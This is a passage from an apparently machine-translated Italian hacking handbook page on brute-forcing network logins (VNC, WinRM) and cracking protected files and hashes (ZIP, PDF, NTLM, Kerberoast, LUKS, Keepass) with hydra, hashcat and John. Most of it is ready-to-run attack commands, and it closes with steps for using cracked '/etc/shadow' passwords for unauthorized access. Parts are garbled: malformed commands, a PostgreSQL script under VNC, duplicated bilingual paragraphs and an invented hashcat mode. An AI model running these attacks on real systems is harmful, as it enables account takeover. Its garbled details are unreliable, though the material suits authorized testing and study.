- Medusa: un altro strumento di Brute Force che può essere utilizzato per attaccare i server VNC.
- Ncrack: uno strumento di autenticazione in rete che supporta anche VNC.

#### Contromisure

Per proteggere un server VNC dagli attacchi di Brute Force, è possibile adottare le seguenti contromisure:

- Utilizzare password complesse e robuste per l'accesso al server VNC.
- Limitare il numero di tentativi di accesso consentiti prima di bloccare l'indirizzo IP del mittente.
- Utilizzare un firewall per filtrare il traffico VNC indesiderato.
- Utilizzare una VPN per crittografare la connessione VNC e proteggere i dati trasmessi.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) è un protocollo di gestione remota per i sistemi operativi Windows. È possibile utilizzare Winrm per eseguire operazioni di amministrazione su macchine remote, come l'esecuzione di comandi, la gestione dei servizi e la modifica delle impostazioni di configurazione.

#### Brute Force su Winrm

La tecnica di Brute Force su Winrm coinvolge l'uso di un programma o uno script per tentare di indovinare le credenziali di accesso a un server Winrm. Questo viene fatto provando una serie di combinazioni di nomi utente e password fino a quando non viene trovata una corrispondenza valida.

Per eseguire un attacco di Brute Force su Winrm, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di tentativi di accesso, riducendo il tempo necessario per trovare le credenziali corrette.

Tuttavia, è importante notare che l'attacco di Brute Force è un'attività illegale e non etica, a meno che non venga eseguito con il consenso esplicito del proprietario del sistema. L'uso di questa tecnica senza autorizzazione può comportare conseguenze legali gravi.

#### Protezione contro gli attacchi di Brute Force su Winrm

Per proteggere un server Winrm dagli attacchi di Brute Force, è possibile adottare diverse misure di sicurezza, tra cui:

- Utilizzare password complesse e robuste per gli account di accesso al server Winrm.
- Limitare il numero di tentativi di accesso consentiti prima di bloccare l'indirizzo IP del mittente.
- Implementare un meccanismo di autenticazione a due fattori per l'accesso al server Winrm.
- Monitorare attentamente i log di accesso per rilevare eventuali attività sospette o tentativi di accesso non autorizzati.
- Aggiornare regolarmente il software del server Winrm per correggere eventuali vulnerabilità note.

Seguendo queste pratiche di sicurezza, è possibile ridurre significativamente il rischio di successo di un attacco di Brute Force su Winrm.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro basati sugli strumenti della community più avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Locale

### Database di cracking online

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 e SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/senza ESS/SSP e con qualsiasi valore di challenge)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, catture WPA2 e archivi MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hash)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hash e hash di file)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hash)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hash)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Controlla questo prima di provare a forzare un hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Attacco di forza bruta con testo in chiaro noto su file zip

È necessario conoscere il **testo in chiaro** (o parte del testo in chiaro) **di un file contenuto all'interno** dello zip crittografato. È possibile verificare **i nomi dei file e le dimensioni dei file contenuti** all'interno di uno zip crittografato eseguendo: **`7z l encrypted.zip`**\
Scarica [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) dalla pagina dei rilasci.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Il formato di file 7z è un formato di archivio compresso che supporta l'algoritmo di compressione LZMA. È possibile utilizzare il tool 7z per creare, estrarre e visualizzare il contenuto di file 7z. 

#### Brute Force su file 7z

La tecnica di Brute Force può essere utilizzata per tentare di indovinare la password di un file 7z. Questo metodo coinvolge la generazione di tutte le possibili combinazioni di caratteri e la loro verifica come password per il file 7z. 

Per eseguire un attacco di Brute Force su un file 7z, è possibile utilizzare strumenti come 7z2john per estrarre l'hash della password dal file 7z e quindi utilizzare un tool di cracking delle password come John the Ripper per tentare di indovinare la password. 

Tuttavia, è importante notare che l'attacco di Brute Force può richiedere molto tempo e risorse computazionali, specialmente se la password è lunga e complessa. Inoltre, l'uso di questa tecnica potrebbe essere illegale senza il consenso del proprietario del file 7z.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Un file PDF (Portable Document Format) è un formato di file ampiamente utilizzato per la visualizzazione e la condivisione di documenti. I file PDF sono comunemente utilizzati per documenti come manuali, report, presentazioni e altro ancora.

#### Brute Force su file PDF

La tecnica di Brute Force può essere utilizzata per tentare di indovinare la password di un file PDF protetto da password. Questo metodo coinvolge la generazione di molte password possibili e il loro tentativo di accesso al file PDF fino a quando non viene trovata la password corretta.

##### Strumenti per il Brute Force su file PDF

Esistono diversi strumenti disponibili per eseguire un attacco di Brute Force su file PDF. Alcuni di questi strumenti includono:

- **pdfcrack**: uno strumento di cracking di password per file PDF.
- **hashcat**: un potente strumento di cracking di password che supporta anche il cracking di file PDF.
- **John the Ripper**: un altro strumento di cracking di password che può essere utilizzato per file PDF.

##### Considerazioni per il Brute Force su file PDF

Prima di eseguire un attacco di Brute Force su un file PDF, è importante considerare quanto segue:

- **Complessità della password**: se la password del file PDF è complessa e lunga, l'attacco di Brute Force potrebbe richiedere molto tempo o potrebbe non avere successo.
- **Risorse del sistema**: l'esecuzione di un attacco di Brute Force richiede molte risorse del sistema, come potenza di calcolo e tempo. Assicurarsi di avere le risorse necessarie prima di avviare l'attacco.
- **Leggi locali**: è importante rispettare le leggi locali e ottenere l'autorizzazione appropriata prima di eseguire un attacco di Brute Force su un file PDF.

##### Conclusioni

Il Brute Force su file PDF può essere un metodo efficace per tentare di indovinare la password di un file PDF protetto. Tuttavia, è importante considerare le considerazioni sopra menzionate e agire in conformità alle leggi locali.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Password del Proprietario del PDF

Per crackare una password del proprietario di un PDF, segui questo link: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Cracking NTLM

NTLM (New Technology LAN Manager) è un protocollo di autenticazione utilizzato in ambienti Windows. È possibile effettuare il cracking di una password NTLM utilizzando attacchi di forza bruta.

#### Utilizzo di John the Ripper

John the Ripper è uno strumento popolare per il cracking delle password. Può essere utilizzato per effettuare il cracking di password NTLM. Ecco come utilizzarlo:

1. Eseguire il comando seguente per generare un file di hash NTLM a partire da una password:

   ```
   echo -n "password" | md4sum | awk '{print $1}'
   ```

   Sostituire "password" con la password da crackare.

2. Salvare l'hash NTLM generato in un file di testo.

3. Eseguire il comando seguente per avviare il cracking della password utilizzando John the Ripper:

   ```
   john --format=nt --wordlist=/path/to/wordlist.txt /path/to/ntlm_hash.txt
   ```

   Sostituire "/path/to/wordlist.txt" con il percorso del file di wordlist contenente le possibili password e "/path/to/ntlm_hash.txt" con il percorso del file contenente l'hash NTLM.

4. Attendere che John the Ripper completi il cracking della password. Una volta completato, verrà visualizzata la password crackata, se trovata.

#### Utilizzo di Hashcat

Hashcat è un altro potente strumento per il cracking delle password. Può essere utilizzato anche per il cracking delle password NTLM. Ecco come utilizzarlo:

1. Eseguire il comando seguente per generare un file di hash NTLM a partire da una password:

   ```
   echo -n "password" | iconv -t utf16le | openssl dgst -md4
   ```

   Sostituire "password" con la password da crackare.

2. Salvare l'hash NTLM generato in un file di testo.

3. Eseguire il comando seguente per avviare il cracking della password utilizzando Hashcat:

   ```
   hashcat -m 1000 -a 0 /path/to/ntlm_hash.txt /path/to/wordlist.txt
   ```

   Sostituire "/path/to/ntlm_hash.txt" con il percorso del file contenente l'hash NTLM e "/path/to/wordlist.txt" con il percorso del file di wordlist contenente le possibili password.

4. Attendere che Hashcat completi il cracking della password. Una volta completato, verrà visualizzata la password crackata, se trovata.

#### Considerazioni finali

Il cracking delle password NTLM può richiedere molto tempo, soprattutto se la password è complessa. È consigliabile utilizzare una wordlist di password completa e aggiornata per aumentare le possibilità di successo. Inoltre, è importante notare che il cracking delle password NTLM è un'attività illegale se effettuata senza il consenso del proprietario del sistema. Assicurarsi di ottenere l'autorizzazione appropriata prima di utilizzare queste tecniche.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass è un gestore di password open source che consente di memorizzare in modo sicuro le password e altre informazioni sensibili. Utilizzando Keepass, è possibile creare un database crittografato in cui archiviare le proprie credenziali. Il database può essere protetto da una password principale o da un file chiave.

Una delle funzionalità più utili di Keepass è la possibilità di generare password complesse in modo automatico. Questo è particolarmente utile quando si desidera creare password sicure per i propri account online. Keepass offre anche la possibilità di organizzare le password in gruppi e di aggiungere note o informazioni aggiuntive a ciascuna voce.

Per accedere alle password memorizzate nel database di Keepass, è necessario inserire la password principale o fornire il file chiave corrispondente. Una volta effettuato l'accesso, è possibile copiare le password in modo sicuro negli appunti o utilizzarle direttamente all'interno del browser o di altre applicazioni.

Keepass è compatibile con diverse piattaforme, tra cui Windows, macOS e Linux. Inoltre, esistono anche versioni per dispositivi mobili, consentendo di accedere alle proprie password anche quando si è in movimento.

È importante notare che Keepass è uno strumento di gestione delle password e non un generatore di password. Pertanto, è necessario creare password complesse e uniche in modo indipendente e utilizzare Keepass per memorizzarle in modo sicuro.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting è una tecnica di attacco che mira a ottenere le password degli account degli utenti all'interno di un dominio Active Directory. Questa tecnica sfrutta una debolezza nel modo in cui le password degli account di servizio vengono archiviate e gestite all'interno di Active Directory.

Il processo di Keberoasting inizia identificando gli account di servizio all'interno del dominio. Gli account di servizio sono account speciali utilizzati per eseguire servizi di sistema o applicazioni all'interno di un ambiente Active Directory. Questi account di solito hanno password complesse e lunghe, ma non vengono mai cambiate o rotate.

Una volta identificati gli account di servizio, l'attaccante può utilizzare uno strumento come "Rubeus" per estrarre i dati di hash delle password degli account di servizio dal dominio. Questi hash possono quindi essere decifrati offline utilizzando tecniche di cracking, come l'uso di tabelle rainbow o l'utilizzo di potenti hardware di calcolo.

Una volta che l'attaccante ha ottenuto le password degli account di servizio, può utilizzarle per accedere ai sistemi e alle risorse all'interno del dominio. Questo può consentire all'attaccante di ottenere ulteriori informazioni sensibili o di eseguire azioni dannose all'interno dell'ambiente.

Per proteggersi dal Keberoasting, è consigliabile implementare una politica di gestione delle password rigorosa per gli account di servizio, che includa la rotazione regolare delle password e l'utilizzo di password complesse. Inoltre, è consigliabile monitorare attentamente l'attività degli account di servizio e utilizzare strumenti di rilevamento delle intrusioni per identificare eventuali attività sospette.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Immagine di Lucks

#### Metodo 1

Installazione: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Metodo 2

##### Brute Force

##### Forza Bruta

Brute force is a technique used to crack passwords or encryption by systematically trying all possible combinations until the correct one is found. It is a time-consuming method, but it can be effective if the password is weak or the encryption algorithm is flawed.

La forza bruta è una tecnica utilizzata per violare password o crittografia, provando sistematicamente tutte le possibili combinazioni fino a trovare quella corretta. È un metodo che richiede molto tempo, ma può essere efficace se la password è debole o l'algoritmo di crittografia è difettoso.

##### Tools

##### Strumenti

There are several tools available for performing brute force attacks. Some popular ones include:

Ci sono diversi strumenti disponibili per eseguire attacchi di forza bruta. Alcuni dei più popolari includono:

- Hydra: A powerful online password cracking tool that supports various protocols such as HTTP, FTP, SSH, and more.

- Hydra: Un potente strumento di cracking di password online che supporta vari protocolli come HTTP, FTP, SSH e altri.

- Medusa: A command-line tool that can perform brute force attacks on various protocols, including HTTP, FTP, and SSH.

- Medusa: Un tool da linea di comando che può eseguire attacchi di forza bruta su vari protocolli, inclusi HTTP, FTP e SSH.

- John the Ripper: A popular password cracking tool that can be used for both offline and online attacks.

- John the Ripper: Un popolare strumento di cracking di password che può essere utilizzato per attacchi sia offline che online.

- Hashcat: A powerful password recovery tool that supports various hash types and algorithms.

- Hashcat: Un potente strumento di recupero password che supporta vari tipi di hash e algoritmi.

##### Techniques

##### Tecniche

When performing a brute force attack, there are several techniques that can be used to optimize the process:

Quando si esegue un attacco di forza bruta, ci sono diverse tecniche che possono essere utilizzate per ottimizzare il processo:

- Dictionary Attack: This technique involves using a pre-generated list of commonly used passwords, known as a dictionary, to try and crack the password.

- Attacco a Dizionario: Questa tecnica consiste nell'utilizzare una lista pre-generata di password comunemente utilizzate, nota come dizionario, per cercare di violare la password.

- Hybrid Attack: This technique combines a dictionary attack with the systematic generation of variations of the dictionary words, such as adding numbers or special characters.

- Attacco Ibrido: Questa tecnica combina un attacco a dizionario con la generazione sistematica di variazioni delle parole del dizionario, come l'aggiunta di numeri o caratteri speciali.

- Mask Attack: This technique involves creating a mask that represents the possible password structure, such as specifying the length and character types, to reduce the number of combinations to try.

- Attacco a Maschera: Questa tecnica consiste nel creare una maschera che rappresenta la struttura possibile della password, come specificare la lunghezza e i tipi di caratteri, per ridurre il numero di combinazioni da provare.

- Rule-based Attack: This technique involves applying a set of rules to the dictionary words or generated passwords to create variations and increase the chances of success.

- Attacco basato su Regole: Questa tecnica consiste nell'applicare un insieme di regole alle parole del dizionario o alle password generate per creare variazioni e aumentare le possibilità di successo.

##### Countermeasures

##### Contromisure

To protect against brute force attacks, it is important to implement strong password policies and use secure encryption algorithms. Additionally, the following countermeasures can be implemented:

Per proteggersi dagli attacchi di forza bruta, è importante implementare politiche di password robuste e utilizzare algoritmi di crittografia sicuri. Inoltre, possono essere implementate le seguenti contromisure:

- Account Lockouts: Implement a mechanism that locks an account after a certain number of failed login attempts to prevent further brute force attacks.

- Blocco degli Account: Implementare un meccanismo che blocca un account dopo un certo numero di tentativi di accesso falliti per prevenire ulteriori attacchi di forza bruta.

- CAPTCHA: Implement a CAPTCHA system that requires users to solve a challenge before attempting to log in, which can help differentiate between humans and automated bots.

- CAPTCHA: Implementare un sistema CAPTCHA che richiede agli utenti di risolvere una sfida prima di tentare di effettuare l'accesso, il che può aiutare a differenziare tra esseri umani e bot automatizzati.

- Rate Limiting: Implement rate limiting mechanisms to restrict the number of login attempts per unit of time, making it more difficult for attackers to perform brute force attacks.

- Limitazione del Tasso: Implementare meccanismi di limitazione del tasso per limitare il numero di tentativi di accesso per unità di tempo, rendendo più difficile per gli attaccanti eseguire attacchi di forza bruta.

- Two-Factor Authentication (2FA): Implement 2FA to add an extra layer of security by requiring users to provide a second form of authentication, such as a code sent to their mobile device, in addition to their password.

- Autenticazione a Due Fattori (2FA): Implementare 2FA per aggiungere un ulteriore livello di sicurezza richiedendo agli utenti di fornire una seconda forma di autenticazione, come un codice inviato al loro dispositivo mobile, oltre alla loro password.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Un altro tutorial su Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Chiave privata PGP/GPG

La chiave privata PGP/GPG è un componente critico per la crittografia a chiave pubblica. Questa chiave viene utilizzata per decifrare i messaggi crittografati inviati a te. È importante proteggere la tua chiave privata in modo sicuro, poiché la sua compromissione potrebbe consentire a un attaccante di accedere ai tuoi dati sensibili. Assicurati di utilizzare una password forte per proteggere la tua chiave privata e di memorizzarla in un luogo sicuro.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Utilizza [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e poi john

### Open Office Pwd Protected Column

Se hai un file xlsx con una colonna protetta da una password, puoi rimuoverla:

* **Caricalo su Google Drive** e la password verrà rimossa automaticamente
* Per **rimuoverla** **manualmente**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificati PFX

I certificati PFX (Personal Information Exchange) sono un formato di file utilizzato per archiviare e trasferire certificati digitali, insieme alle relative chiavi private. Questo formato è comunemente utilizzato per l'installazione di certificati su server web e applicazioni.

I certificati PFX possono essere protetti da una password, che deve essere fornita per accedere alle chiavi private contenute nel file. Questa password è critica per garantire la sicurezza del certificato e delle informazioni sensibili ad esso associate.

Per utilizzare un certificato PFX, è necessario importarlo nel sistema o nell'applicazione desiderata. Questo può essere fatto utilizzando strumenti come OpenSSL o tramite l'interfaccia utente fornita dal sistema operativo o dall'applicazione.

È importante tenere presente che i certificati PFX possono essere soggetti a attacchi di forza bruta, in cui un attaccante cerca di indovinare la password per accedere alle chiavi private. Pertanto, è consigliabile utilizzare password complesse e robuste per proteggere i certificati PFX e ridurre il rischio di accesso non autorizzato.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro con gli strumenti della community più avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Strumenti

**Esempi di hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Liste di parole

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Strumenti per la generazione di liste di parole**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generatore avanzato di sequenze di tasti con caratteri di base, mappatura dei tasti e percorsi configurabili.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutazione di John

Leggi _**/etc/john/john.conf**_ e configurarlo.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Attacchi di Hashcat

* **Attacco con lista di parole** (`-a 0`) con regole

**Hashcat** già include una **cartella contenente regole**, ma puoi trovare [**altre regole interessanti qui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Attacco di combinazione di wordlist**

È possibile **combinare 2 wordlist in 1** con hashcat.\
Se la lista 1 contenesse la parola **"ciao"** e la seconda contenesse 2 righe con le parole **"mondo"** e **"terra"**. Le parole `ciaomondo` e `ciaoterra` verranno generate.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Attacco a maschera** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Attacco Wordlist + Maschera (`-a 6`) / Maschera + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modalità di Hashcat

Hashcat è uno strumento di cracking di password che supporta diverse modalità di attacco. Di seguito sono elencate le modalità di Hashcat più comuni:

- **Modalità di attacco a forza bruta**: Hashcat prova tutte le possibili combinazioni di caratteri per trovare la password corretta. Questa modalità è molto lenta e richiede molto tempo, ma è efficace quando non si conosce nulla sulla password.
- **Modalità di attacco a dizionario**: Hashcat utilizza un dizionario di parole predefinite per cercare corrispondenze con la password crittografata. Questa modalità è più veloce della forza bruta, ma richiede un dizionario di parole ben curato.
- **Modalità di attacco ibrido**: Hashcat combina l'attacco a forza bruta con l'attacco a dizionario, cercando tutte le possibili combinazioni di caratteri e confrontandole con il dizionario di parole. Questa modalità è più efficace della forza bruta o dell'attacco a dizionario da soli.
- **Modalità di attacco regolare**: Hashcat utilizza espressioni regolari per generare tutte le possibili combinazioni di caratteri che corrispondono a un determinato pattern. Questa modalità è utile quando si conosce una parte della password o si ha un'idea del suo formato.
- **Modalità di attacco maschera**: Hashcat utilizza una maschera per generare tutte le possibili combinazioni di caratteri che corrispondono a un determinato pattern. Questa modalità è simile all'attacco regolare, ma offre maggiore flessibilità nella definizione del pattern.
- **Modalità di attacco a regole**: Hashcat applica regole predefinite o personalizzate alle password candidate per generare varianti e aumentare le possibilità di successo. Questa modalità è utile quando si conoscono alcune informazioni sulla password o si desidera sperimentare diverse trasformazioni.
- **Modalità di attacco a combinazione**: Hashcat combina due o più file di hash per cercare corrispondenze tra le password crittografate. Questa modalità è utile quando si dispone di più file di hash e si desidera trovare password comuni tra di loro.
- **Modalità di attacco a permutazione**: Hashcat permuta le lettere all'interno di una parola per generare tutte le possibili combinazioni. Questa modalità è utile quando si conosce una parte della password ma non la sua disposizione esatta.
- **Modalità di attacco a regole personalizzate**: Hashcat permette di creare regole personalizzate per adattare l'attacco alle esigenze specifiche. Questa modalità offre maggiore flessibilità e controllo sull'attacco.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Cracking Linux Hashes - File /etc/shadow

## Introduction

In Linux systems, the `/etc/shadow` file stores user account information, including hashed passwords. As a hacker, cracking these hashes can provide access to user accounts and potentially sensitive information.

## Methodology

To crack Linux hashes from the `/etc/shadow` file, follow these steps:

1. **Obtain the `/etc/shadow` file**: Gain access to the target Linux system and locate the `/etc/shadow` file. This file is typically readable only by the root user.

2. **Extract the hashes**: Extract the password hashes from the `/etc/shadow` file. Each hash is stored between two colons (`:`) and consists of several fields, including the username, salt, and the actual hash.

3. **Choose a cracking method**: Select an appropriate cracking method based on the type of hash used. Common methods include dictionary attacks, brute-force attacks, and rainbow table attacks.

4. **Prepare the cracking tool**: Set up the chosen cracking tool, such as John the Ripper or Hashcat, with the necessary parameters and options. These tools support various hash types and cracking techniques.

5. **Crack the hashes**: Run the cracking tool against the extracted hashes, using the chosen cracking method. The tool will attempt to find the original passwords by trying different combinations or using precomputed tables.

6. **Analyze the results**: Once the cracking process is complete, analyze the results to identify any successfully cracked passwords. These passwords can be used to gain unauthorized access to user accounts.

## Conclusion

